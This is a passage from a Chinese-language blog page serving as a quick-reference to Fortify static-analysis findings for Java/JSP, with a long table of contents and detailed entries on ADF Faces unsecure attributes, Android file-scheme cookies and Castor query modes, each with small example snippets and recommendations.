class="toc-number">1.6.85.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Unused-Action-Form"><span class="toc-number">1.6.86.</span> <span class="toc-text">Struts: Unused Action Form</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-337"><span class="toc-number">1.6.86.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-337"><span class="toc-number">1.6.86.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-336"><span class="toc-number">1.6.86.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-335"><span class="toc-number">1.6.86.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Unused-Validation-Form"><span class="toc-number">1.6.87.</span> <span class="toc-text">Struts: Unused Validation Form</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-338"><span class="toc-number">1.6.87.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-338"><span class="toc-number">1.6.87.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-337"><span class="toc-number">1.6.87.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-336"><span class="toc-number">1.6.87.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Unvalidated-Action-Form"><span class="toc-number">1.6.88.</span> <span class="toc-text">Struts: Unvalidated Action Form</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-339"><span class="toc-number">1.6.88.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-339"><span class="toc-number">1.6.88.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-338"><span class="toc-number">1.6.88.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-337"><span class="toc-number">1.6.88.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Validator-Turned-Off"><span class="toc-number">1.6.89.</span> <span class="toc-text">Struts: Validator Turned Off</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-340"><span class="toc-number">1.6.89.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-340"><span class="toc-number">1.6.89.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-339"><span class="toc-number">1.6.89.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-338"><span class="toc-number">1.6.89.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Struts-Validator-Without-Form-Field"><span class="toc-number">1.6.90.</span> <span class="toc-text">Struts: Validator Without Form Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-341"><span class="toc-number">1.6.90.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-341"><span class="toc-number">1.6.90.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-340"><span class="toc-number">1.6.90.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-339"><span class="toc-number">1.6.90.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-JNI"><span class="toc-number">1.6.91.</span> <span class="toc-text">Unsafe JNI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-342"><span class="toc-number">1.6.91.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-342"><span class="toc-number">1.6.91.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-341"><span class="toc-number">1.6.91.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-340"><span class="toc-number">1.6.91.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-JSNI"><span class="toc-number">1.6.92.</span> <span class="toc-text">Unsafe JSNI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-343"><span class="toc-number">1.6.92.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-343"><span class="toc-number">1.6.92.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-342"><span class="toc-number">1.6.92.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-341"><span class="toc-number">1.6.92.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unsafe-Reflection"><span class="toc-number">1.6.93.</span> <span class="toc-text">Unsafe Reflection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-344"><span class="toc-number">1.6.93.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-344"><span class="toc-number">1.6.93.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-343"><span class="toc-number">1.6.93.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-342"><span class="toc-number">1.6.93.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML-Entity-Expansion-Injection"><span class="toc-number">1.6.94.</span> <span class="toc-text">XML Entity Expansion Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-345"><span class="toc-number">1.6.94.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-345"><span class="toc-number">1.6.94.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-344"><span class="toc-number">1.6.94.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-343"><span class="toc-number">1.6.94.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML-External-Entity-Injection"><span class="toc-number">1.6.95.</span> <span class="toc-text">XML External Entity Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-346"><span class="toc-number">1.6.95.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-346"><span class="toc-number">1.6.95.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-345"><span class="toc-number">1.6.95.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-344"><span class="toc-number">1.6.95.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML-Injection"><span class="toc-number">1.6.96.</span> <span class="toc-text">XML Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-347"><span class="toc-number">1.6.96.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-347"><span class="toc-number">1.6.96.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-346"><span class="toc-number">1.6.96.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-345"><span class="toc-number">1.6.96.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XPath-Injection"><span class="toc-number">1.6.97.</span> <span class="toc-text">XPath Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-348"><span class="toc-number">1.6.97.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-348"><span class="toc-number">1.6.97.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-347"><span class="toc-number">1.6.97.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-346"><span class="toc-number">1.6.97.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XQuery-Injection"><span class="toc-number">1.6.98.</span> <span class="toc-text">XQuery Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-349"><span class="toc-number">1.6.98.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-349"><span class="toc-number">1.6.98.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-348"><span class="toc-number">1.6.98.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-347"><span class="toc-number">1.6.98.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSLT-Injection"><span class="toc-number">1.6.99.</span> <span class="toc-text">XSLT Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-350"><span class="toc-number">1.6.99.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-350"><span class="toc-number">1.6.99.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-349"><span class="toc-number">1.6.99.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-348"><span class="toc-number">1.6.99.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Unsafe-BeanUtils-Deserialization"><span class="toc-number">1.6.100.</span> <span class="toc-text">Dynamic Code Evaluation: Unsafe BeanUtils Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-351"><span class="toc-number">1.6.100.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-351"><span class="toc-number">1.6.100.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-350"><span class="toc-number">1.6.100.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-349"><span class="toc-number">1.6.100.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Unsafe-YAML-Deserialization"><span class="toc-number">1.6.101.</span> <span class="toc-text">Dynamic Code Evaluation: Unsafe YAML Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-352"><span class="toc-number">1.6.101.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-352"><span class="toc-number">1.6.101.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-351"><span class="toc-number">1.6.101.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-350"><span class="toc-number">1.6.101.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fragment-Injection"><span class="toc-number">1.6.102.</span> <span class="toc-text">Fragment Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-353"><span class="toc-number">1.6.102.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-353"><span class="toc-number">1.6.102.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-352"><span class="toc-number">1.6.102.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-351"><span class="toc-number">1.6.102.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Cross-Site-Scripting-Protection"><span class="toc-number">1.6.103.</span> <span class="toc-text">HTML5: Cross-Site Scripting Protection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-354"><span class="toc-number">1.6.103.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-354"><span class="toc-number">1.6.103.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-353"><span class="toc-number">1.6.103.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-352"><span class="toc-number">1.6.103.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Missing-Form-Field-Validation"><span class="toc-number">1.6.104.</span> <span class="toc-text">Missing Form Field Validation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-355"><span class="toc-number">1.6.104.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-355"><span class="toc-number">1.6.104.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-354"><span class="toc-number">1.6.104.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-353"><span class="toc-number">1.6.104.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NoSQL-Injection-DynamoDB"><span class="toc-number">1.6.105.</span> <span class="toc-text">NoSQL Injection: DynamoDB</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-356"><span class="toc-number">1.6.105.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-356"><span class="toc-number">1.6.105.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-354"><span class="toc-number">1.6.105.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#NoSQL-Injection-MongoDB"><span class="toc-number">1.6.106.</span> <span class="toc-text">NoSQL Injection: MongoDB</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-357"><span class="toc-number">1.6.106.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-357"><span class="toc-number">1.6.106.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-355"><span class="toc-number">1.6.106.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Spring-Misconfiguration-HTML-Escaping-Disabled"><span class="toc-number">1.6.107.</span> <span class="toc-text">Spring Misconfiguration: HTML Escaping Disabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-358"><span class="toc-number">1.6.107.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-358"><span class="toc-number">1.6.107.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-355"><span class="toc-number">1.6.107.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-356"><span class="toc-number">1.6.107.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li></ol></li></ol>
         </div>
   <script type="text/javascript">
  function showToc(){
    var toc_article = document.getElementById("toc-article");
    var show_toc_btn = document.getElementById("show-toc-btn");
    toc_article.setAttribute("style","display:block");
    show_toc_btn.setAttribute("style","display:none");
    };
  function showBtn(){
    var toc_article = document.getElementById("toc-article");
    var show_toc_btn = document.getElementById("show-toc-btn");
    toc_article.setAttribute("style","display:none");
    show_toc_btn.setAttribute("style","display:block");
    };
   </script>
      
<!-- 目录内容结束 -->

    <div class="article-entry" itemprop="articleBody">
      
        <p>fortify扫描结果速查(Java/JSP)-API误用，篇幅较大，推荐使用ctrl+F查找~~~<br><a id="more"></a></p>
<h2 id="Java-JSP"><a href="#Java-JSP" class="headerlink" title="Java/JSP"></a>Java/JSP</h2><p>API误用<br>API 是调用方与被调用方之间的合约。最常见的 API 滥用形式是由于调用方未能履行本合约而造成的。例如，如果程序未能在调用 chroot() 之后调用 chdir()，则违反了合约针对如何以安全的方式更改活动根目录的规定。库滥用的另一个绝佳示例是希望被调用方将可信 DNS 信息返回给调用方。在这种情况下，调用方通过对被调用方的行为做出某些假设（即返回值可用于身份验证）而滥用被调用方 API。此外，一方还可以从另一方违反调用方和被调用方间的合约。例如，如果编码器将 SecureRandom 归入子类并返回非随机值，则违反了合约。</p>
<p>代码质量<br>代码质量低会导致不可预知的行为。从用户角度来看，这种情况通常表现为可用性差。对于攻击者而言，它提供了以各种意想不到的方式为系统施压的机会。</p>
<p>封装<br>封装是指划定明确的边界。在 Web 浏览器中，这可能意味着确保您的移动代码不会被其他移动代码滥用。在服务器上，它可能意味着对经过验证的数据和未经验证的数据、一个用户的数据和另一用户的数据或对用户可以查看的数据和不能查看的数据进行区分。</p>
<p>环境配置</p>
<p>这部分包含源代码以外的所有内容，但对于即将创建的产品的安全仍至关重要。因为此分类中涵盖的问题与源代码没有直接关系，所以我们将其与其他分类分开。</p>
<p>异常处理</p>
<p>错误和错误处理代表 API 的一个类。与错误处理相关的错误十分常见，它们单独需要一个特殊的界。对于“API 滥用”，有两种方式可以引入与错误相关的安全漏洞：最常用的方式是不当处理错误（或根本不处理）。第二种方式是制造提供太多信息（给潜在的攻击者）或难以处理的错误。</p>
<p>输入验证与展示问题</p>
<p>输入验证和表示问题是由于元字符、备选编码和数值表示而引起的。安全问题是由于信任输入而引起的。这些问题包括：“缓冲区溢出”、“跨站点脚本”攻击、“SQL 注入”和许多其他问题。</p>
<p>安全特性</p>
<p>软件安全不是安全软件。在此处，我们讨论类似于身份验证、访问控制、机密性、加密和权限管理之类的主题。</p>
<p>时间和状态</p>
<p>分布式计算与时间和状态有关。即，为了使多个组件进行通信，必须共享状态，而这一切都需要时间。</p>
<p>大部分程序员会将其工作人格化。他们想象一个控制线程以他们会采用的相同方式执行整个程序（如果他们需要自己完成任务的话）。但是，现代计算机可以在不同的任务之间迅速切换，并且是在多核、多 CPU 或分布式系统中进行切换，两个事件可以在完全相同的时间发生。对于程序如何执行，程序员的模型和实际情况之间存在差距，匆忙之中缺陷便会趁虚而入。这些缺陷与线程、进程、时间和信息之间的意外交互相关。这些交互通过共享状态实现：信号、变量、文件系统以及基本上任何可以存储信息的介质。</p>
<h3 id="API误用"><a href="#API误用" class="headerlink" title="API误用"></a>API误用</h3><p>API 是调用方与被调用方之间的合约。最常见的 API 滥用形式是由于调用方未能履行本合约而造成的。例如，如果程序未能在调用 chroot() 之后调用 chdir()，则违反了合约针对如何以安全的方式更改活动根目录的规定。库滥用的另一个绝佳示例是希望被调用方将可信 DNS 信息返回给调用方。在这种情况下，调用方通过对被调用方的行为做出某些假设（即返回值可用于身份验证）而滥用被调用方 API。此外，一方还可以从另一方违反调用方和被调用方间的合约。例如，如果编码器将 SecureRandom 归入子类并返回非随机值，则违反了合约。<br>ADF Faces Bad Practices: unsecure Attribute</p>
<p>Castor Bad Practices: Query Mode Not Read-Only</p>
<p>Castor Bad Practices: Unspecified Query Mode</p>
<p>Code Correctness: Call to System.gc()</p>
<p>Code Correctness: Class Does Not Implement equals</p>
<p>Code Correctness: Erroneous finalize() Method</p>
<p>Code Correctness: Incorrect Serializable Method Signature</p>
<p>Code Correctness: Multiple Stream Commits</p>
<p>Code Correctness: Negative Content-Length</p>
<p>Code Correctness: toString on Array</p>
<p>Dangerous Field</p>
<p>Dangerous Method</p>
<p>Dangerous Type</p>
<p>EJB Bad Practices: Use of AWT/Swing</p>
<p>EJB Bad Practices: Use of Class Loader</p>
<p>EJB Bad Practices: Use of Sockets</p>
<p>EJB Bad Practices: Use of Synchronization Primitives</p>
<p>EJB Bad Practices: Use of java.io</p>
<p>File Disclosure: J2EE</p>
<p>File Disclosure: Spring</p>
<p>File Disclosure: Spring Webflow</p>
<p>File Disclosure: Struts</p>
<p>Immutable Classes: Field Mutation</p>
<p>Immutable Classes: Non-final Fields</p>
<p>Immutable Classes: Public Mutable Fields</p>
<p>J2EE Bad Practices: Sockets</p>
<p>J2EE Bad Practices: getConnection()</p>
<p>Mass Assignment: Insecure Binder Configuration</p>
<p>Mass Assignment: Request Parameters Bound into Persisted Objects</p>
<p>Missing Check against Null</p>
<p>Missing Check for Null Parameter</p>
<p>Object Model Violation: Erroneous clone() Method</p>
<p>Object Model Violation: Just one of equals() and hashCode() Defined</p>
<p>Object Model Violation: Just one of restoreState() and saveState() Defined</p>
<p>Obsolete: Deprecated by ESAPI</p>
<p>Often Misused: Android Permission Check</p>
<p>Often Misused: Authentication</p>
<p>Often Misused: Boolean.getBoolean()</p>
<p>Often Misused: Encoding</p>
<p>Often Misused: File Upload</p>
<p>Often Misused: Spring Remote Service</p>
<p>Often Misused: Spring Web Service</p>
<p>Password Management: Weak Redundancy</p>
<p>Poor Style: Explicit Call to finalize()</p>
<p>Struts 2 Bad Practices: Application Map Tampering</p>
<p>Struts 2 Bad Practices: Dynamic Method Invocation</p>
<p>Struts 2 Bad Practices: Request Map Tampering</p>
<p>Struts 2 Bad Practices: Session Map Tampering</p>
<p>Unchecked Return Value</p>
<h4 id="ADF-Faces-Bad-Practices-unsecure-Attribute"><a href="#ADF-Faces-Bad-Practices-unsecure-Attribute" class="headerlink" title="ADF Faces Bad Practices: unsecure Attribute"></a>ADF Faces Bad Practices: unsecure Attribute</h4><h5 id="ABSTRACT"><a href="#ABSTRACT" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>unsecure 属性会指定可在客户端上设置值的属性列表。</p>
<h5 id="EXPLANATION"><a href="#EXPLANATION" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Oracle ADF Faces 组件的属性值通常只能在服务器上设置。但许多组件都允许开发人员定义可在客户端上设置的属性列表。这些组件的 unsecure 属性可以指定此列表。</p>
<p>目前唯一一个可在 unsecure 属性中显示的属性是 disabled，该属性允许客户端定义要启用和禁用的组件。最好不要让客户端控制只应在服务器上设置的属性值。</p>
<p>示例：以下代码显示了从用户收集密码信息并使用 unsecure 属性的 inputText 组件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;af:inputText id=&quot;pwdBox&quot;</span><br><span class="line"></span><br><span class="line">              label=&quot;#&#123;resources.PWD&#125;&quot;</span><br><span class="line"></span><br><span class="line">              value=&quot;&quot;#&#123;userBean.password&#125;</span><br><span class="line"></span><br><span class="line">              unsecure=&quot;disabled&quot;</span><br><span class="line"></span><br><span class="line">              secret=&quot;true&quot;</span><br><span class="line"></span><br><span class="line">              required=&quot;true&quot;/&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS"><a href="#RECOMMENDATIONS" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>最好不要让客户端控制可在服务器上设置的属性值。特别是在使用输入和命令组件时，避免使用此功能。</p>
<h5 id="REFERENCES"><a href="#REFERENCES" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Oracle ADF Faces Tag Reference</p>
<h4 id="Android-Bad-Practices-Use-of-File-Scheme-Cookies"><a href="#Android-Bad-Practices-Use-of-File-Scheme-Cookies" class="headerlink" title="Android Bad Practices: Use of File Scheme Cookies"></a>Android Bad Practices: Use of File Scheme Cookies</h4><h5 id="ABSTRACT-1"><a href="#ABSTRACT-1" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>应用程序允许将 Cookie 用于 file:// 协议，这可能导致不利的安全隐患。</p>
<h5 id="EXPLANATION-1"><a href="#EXPLANATION-1" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>根据 RFC 2109，Cookie 严格意义上属于 HTTP 机制。 不应用于除 HTTP 以外的其他协议，包括 file://。 目前还不清楚它们的行为应该是什么，以及适用何种安全分隔规则。 例如，从 Internet 下载到本地磁盘的 HTML 文件是否应与本地安装的任意 HTML 代码共享相同的 Cookie？</p>
<h5 id="RECOMMENDATIONS-1"><a href="#RECOMMENDATIONS-1" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>根据 Android 文档，将 Cookie 用于文件架构 URL 具有安全隐患并且默认会被关闭。 请勿使用此功能，除非您可以确定不会发生意外的 Cookie 数据共享。</p>
<h5 id="REFERENCES-1"><a href="#REFERENCES-1" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data</p>
<h4 id="Castor-Bad-Practices-Query-Mode-Not-Read-Only"><a href="#Castor-Bad-Practices-Query-Mode-Not-Read-Only" class="headerlink" title="Castor Bad Practices: Query Mode Not Read-Only"></a>Castor Bad Practices: Query Mode Not Read-Only</h4><h5 id="ABSTRACT-2"><a href="#ABSTRACT-2" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>非只读模式的 Castor 查询可能会影响性能。</p>
<h5 id="EXPLANATION-2"><a href="#EXPLANATION-2" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>即便 castor 创建了对象的锁定，也不能阻止其他线程对该对象执行读取或写入。另外，与默认的共享模式相比，只读模式的查询的运行速度大约是前者的 7 倍。</p>
<p>例 1：下例指定 SHARED 查询模式，该模式允许读取和写入访问。</p>
<p><code>results = query.execute(Database.SHARED);</code></p>
<h5 id="RECOMMENDATIONS-2"><a href="#RECOMMENDATIONS-2" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果不需要对检索的对象进行修改，请确保查询为只读模式。</p>
<p>例 2：下例指定只读查询模式。</p>
<p><code>results = query.execute(Database.READONLY);</code></p>
<p>从设计的角度而言，使用只读查询符合最小特权的准则。如果攻击者找到了修改 Castor 对象的方法，只读查询可限制其造成的破坏。</p>
<h5 id="REFERENCES-2"><a href="#REFERENCES-2" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] ExoLab Group Castor JDO - Best practice</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 265</p>
<p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 7.1.1</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 7.1.1</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 7.1.2</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 7.1.2</p>
